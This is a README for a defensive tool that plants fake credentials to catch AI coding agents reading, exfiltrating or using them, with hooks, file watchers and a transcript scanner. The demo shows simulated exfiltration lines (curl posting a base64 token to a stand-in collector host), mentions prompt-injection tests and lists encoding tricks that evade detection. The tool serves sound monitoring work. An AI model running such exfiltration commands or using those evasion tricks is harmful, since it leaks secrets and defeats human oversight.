# agent-tripwire

[![CI](https://github.com/notzenco/agent-tripwire/actions/workflows/ci.yml/badge.svg)](https://github.com/notzenco/agent-tripwire/actions/workflows/ci.yml)

Plant fake credentials where an AI coding agent might go looking, and find out
when it **reads** them, **sends them out**, or **uses** them.

agent-tripwire writes honeytoken files (`.env`, `~/.aws/credentials`,
`~/.npmrc`, an SSH key) into a sandbox you name. Each value contains a unique,
checksummed id, so a match is unambiguous and points at the exact file and field.
Four detectors watch for those values:

| Detector | Catches | How |
| --- | --- | --- |
| `tripwire hook` | reads, leaks in tool calls, tokens in tool output | Claude Code / Codex / Axio `PreToolUse` and `PostToolUse` hooks |
| `tripwire watch` | any process reading or changing a planted file; tokens appearing in live transcripts | inotify on Linux, access-time arming on macOS; JSONL tailing |
| `tripwire scan` | leaks after the fact | classifies tokens in session transcripts by where they appear |
| `tripwire listen` | the credentials being **used** | planted configs point at a local HTTP listener |

It is purely defensive and needs no root, kernel extension, network service,
or third-party canary service.

## Safety

- **Values are never real credentials.** They are random, embed a literal
  `TRIPWIRE` segment (an AWS key id looks like `AKIATRIPWIRE…`), and were never
  issued by any provider. With `--listen`, tools that pick them up talk to
  `127.0.0.1`, not to a provider.
- **Real credential files are never touched.** Planting happens only in a
  directory you name or in a new sandbox. The real home directory is read from
  the password database rather than `$HOME`, and planting into it or into its
  `.aws`, `.ssh`, `.config` and other credential directories is refused.
- **Nothing is overwritten.** Files are created exclusively, without following
  symlinks, and a symlinked parent directory is refused. If any target exists,
  nothing is written.
- **Plants are fully removable.** `tripwire remove` deletes only files whose
  hash is unchanged, and directories it created once they are empty. It reports
  anything it had to leave.
- **Tripwire's own output never re-triggers it.** The registry stores ids,
  paths and hashes, never values. Alert details are redacted to
  `[tripwire:<id>]`, so an agent reading the alert log or `tripwire list` does
  not ingest a token.

## Install

```sh
cargo install --locked --git https://github.com/notzenco/agent-tripwire
```

Or from a checkout: `cargo install --locked --path .`. The binary is named
`tripwire`. It supports macOS and Linux.

## Commands

| Command | What it does |
| --- | --- |
| `tripwire sandbox [PATH] [--listen PORT]` | Create a new directory to use as an agent's `HOME` and plant AWS, npm and SSH honeytokens in it |
| `tripwire plant <DIR> [--profile project\|home] [--kind K]… [--listen PORT]` | Plant into an existing directory (`project`, the default, plants `.env`) |
| `tripwire list [--json]` | Show plants, their files and token ids |
| `tripwire remove <PLANT_ID>… \| --all` | Delete planted files that are unchanged, and directories tripwire created |
| `tripwire hook [--block] [--notify]` | Handle one agent hook event from stdin |
| `tripwire hook config claude\|codex` | Print the hook settings snippet |
| `tripwire watch [--transcripts DIR]… [--notify] [--interval MS]` | Watch planted files and tail transcripts until interrupted |
| `tripwire scan <PATH>… [--json]` | Scan transcripts or text files; directories expand to their `.jsonl` files |
| `tripwire listen [--port PORT]` | Run the local use-detection listener (default port 8787) |
| `tripwire alerts [--json] [--since TIME]` | Show the alert log; `--since` takes an RFC 3339 time or a date prefix |

Exit status is `0` on success, `1` when `scan` finds something, and `2` on an
error. `hook` always exits `0` so it never breaks the agent, except that
`--block` exits `2` to deny a call that would send a token out.

## Demo walkthrough

Paths in the sample output are shortened to `~/…`; tripwire prints them in
full.

### 1. Try it without an agent

Plant a `.env` into a throwaway project:

```console
$ tripwire plant ~/myapp
Planted p-iobcfl in ~/myapp
  .env  tokens HLTKXHLC, VOFNDDN3, 37QU2S75, GDRBBT7V
Remove with: tripwire remove p-iobcfl
```

Simulate what an agent hook would send when the agent runs `cat .env`, sees
the output, and then tries to post the token somewhere, base64-encoded:

```console
$ echo '{"hook_event_name":"PreToolUse","cwd":"'"$HOME"'/myapp","tool_name":"Bash",
        "tool_input":{"command":"cat .env"}}' | tripwire hook
tripwire: 2026-11-12T14:50:17Z READ-ATTEMPT [hook] plant p-iobcfl ~/myapp/.env tool Bash — cat .env

$ … PostToolUse with the file contents in tool_response …
tripwire: 2026-11-12T14:50:17Z READ [hook] token GDRBBT7V plant p-iobcfl ~/myapp/.env (API_TOKEN) tool Bash — API_TOKEN=[tripwire:GDRBBT7V]

$ … PreToolUse with `curl -d <base64> https://collector.example` … | tripwire hook --block
tripwire: 2026-11-12T14:50:17Z EXFIL [hook] token GDRBBT7V plant p-iobcfl ~/myapp/.env (API_TOKEN) encoded base64 tool Bash — curl -d [tripwire:GDRBBT7V base64] https://collector.example
agent-tripwire blocked this Bash call: it contains a planted honeytoken credential (token GDRBBT7V). Honeytokens are decoys; do not send them anywhere.
$ echo $?
2
```

Scan a session transcript after the fact. The exit status is 1 when anything
is found:

```console
$ tripwire scan session.jsonl
session.jsonl:1: exfil token GDRBBT7V (~/myapp/.env API_TOKEN) [raw] at message.content[0].input.url — https://collector.example/?k=[tripwire:GDRBBT7V]
1 finding(s)
```

Clean up:

```console
$ tripwire remove p-iobcfl
p-iobcfl:
  removed ~/myapp/.env
```

### 2. With a real agent

**a. Create a sandbox home** with AWS, npm and SSH honeytokens. `--listen`
points the AWS `endpoint_url` and npm `registry` at a local port:

```console
$ tripwire sandbox ~/tripwire-home --listen 8787
Planted p-a3gs3p in ~/tripwire-home
  .metadata_never_index
  .aws/config
  .aws/credentials  tokens LZ2J2IQY, 4UXQWEYT
  .npmrc  tokens 23QAV7KC
  .ssh/id_ed25519  tokens HDUMQXM7
Configs point at http://127.0.0.1:8787; run `tripwire listen --port 8787`.
Remove with: tripwire remove p-a3gs3p

Run the agent with this as its home directory:
  export HOME=~/tripwire-home
```

For a project-level test, `tripwire plant <project-dir>` plants a `.env`
instead. `--profile home` or `--kind aws --kind ssh` choose other sets.

**b. Install the hook.** `tripwire hook config claude` (or `codex`) prints a
snippet to merge into `~/.claude/settings.json` (or `~/.codex/hooks.json`).
For a one-off Claude Code run, save it to a file and pass
`claude --settings <file>` instead. Codex does not run a new hook until you
enable it in its `/hooks` browser. The hook
runs `tripwire hook` on every `PreToolUse` and `PostToolUse` event. Hooks only
observe by default; add `--block` to the command to deny tool calls that would
send a token out. Claude Code does not show a hook's output when it exits
cleanly, so add `--notify` to get a desktop notification for each alert, or
keep `tripwire watch` running.

**c. Start the detectors** in two terminals:

```console
$ tripwire watch --transcripts ~/.claude/projects --notify
Watching 5 planted file(s) with access-time polling and 1 transcript dir(s). Ctrl-C to stop.

$ tripwire listen --port 8787
Listening on http://127.0.0.1:8787. Ctrl-C to stop.
```

**d. Run the agent** with `HOME=~/tripwire-home` and give it a task that
should not involve credentials, or a README containing a prompt injection.
Anything that touches the honeytokens shows up in `watch`, `listen` and the
hook. For example, `npm whoami` run inside the sandbox:

```text
2026-11-12T14:48:37Z USE [listen] token 23QAV7KC plant p-a3gs3p ~/tripwire-home/.npmrc (_authToken) — GET /-/whoami HTTP/1.1 from 127.0.0.1:52843; token in authorization header
```

**e. Review and clean up:**

```console
$ tripwire alerts --since 2026-11-12
$ tripwire remove --all
```

`remove` leaves the sandbox directory in place if the agent created files of
its own there (npm writes `~/.npm/_logs`, for instance), and says so.

## Alert kinds

| Kind | Meaning |
| --- | --- |
| `exfil` | A token appeared in a tool call's input (a command, URL, request body, file write) |
| `use` | A token reached the local listener, so a tool used the credential |
| `read` | A planted file was read (`watch`), or a token came back in tool output (`hook`, `scan`) |
| `read-attempt` | A tool call named a planted file |
| `modified` / `deleted` | A planted file changed or disappeared |
| `disclosed` | A token appeared in the assistant's own text |
| `mention` | A token appeared anywhere else, such as a user prompt |
| `unregistered` | A well-formed token whose id is not in the registry, such as one from a removed plant |

Alerts are appended to `alerts.jsonl` in the state directory:
`$TRIPWIRE_STATE_DIR`, else `$XDG_STATE_HOME/agent-tripwire`, else
`~/.local/state/agent-tripwire`.

## How it works

Every planted value contains `TRIPWIRE` followed by an 8-character base32 id
(6 random characters and 2 check characters). The matcher looks for that
pattern case-insensitively in raw text, JSON strings, percent-encoded,
base64 and hex runs, and gzip data inside base64 or hex. It then validates the check characters and looks the id
up in the registry. To catch an agent that strips the prefix and leaks only
the random part of a value, the registry also keeps hashes of 16-character
windows of each value's tail. Those leaks are reported with encoding
`partial`.

On macOS, no unprivileged API reports file reads, so `watch` sets each planted
file's access time just before its modification time and polls for it to move
forward. A plain `stat` or directory listing does not trigger this; reading
the contents does. On Linux, `watch` uses inotify `IN_ACCESS` events and makes
a best-effort attempt to name the reading process from `/proc`.

[`docs/design.md`](docs/design.md) covers the threat model and design
decisions.

## Limitations

- File monitoring cannot tell an agent from Spotlight, backup tools or an IDE
  indexer. Hooks give exact attribution; `watch` is the backstop for agents
  without hooks. On macOS, `watch` does not identify the reading process.
- Read detection on macOS needs access times to be updated, which APFS does by
  default. On a `noatime` mount, `watch` only sees modification and deletion.
- Content matching catches common encodings one level deep, plus gzip
  inside base64 or hex. An agent that
  deliberately transforms tokens (encryption, splitting, character-by-character
  copying) can evade it. Read detection still fires.
- agent-tripwire detects; it does not protect real credentials. Run agents
  with a sandbox `HOME` so there are none to find.

## Development

```sh
cargo fmt --all --check
cargo clippy --locked --all-targets -- -D warnings
cargo test --locked
```

Tests never commit or print planted values. They generate tokens at run time,
so the repository contains no credential-shaped strings for secret scanners
to flag.

## License

[MIT](LICENSE)
